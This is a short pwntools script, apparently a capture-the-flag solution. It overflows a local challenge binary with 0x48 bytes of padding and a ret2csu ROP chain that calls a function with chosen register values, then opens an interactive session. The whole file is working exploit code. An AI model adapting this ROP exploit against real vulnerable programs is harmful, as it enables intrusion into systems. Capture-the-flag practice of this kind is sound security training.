from pwn import *

exe = ELF("./chall")
context.binary = exe

if args.GDB:
	r = gdb.debug("./chall", """
		c
	""")
else:
	r = process("./chall")

rop = ROP(exe)
rop.ret2csu(edi=0xdeadbeef, rsi=0xcafebabe, rdx=0x0badf00d, call=exe.sym.why_am_i_here)
print(rop.dump())
r.send(b"A" * 0x48 + rop.chain())

r.interactive()
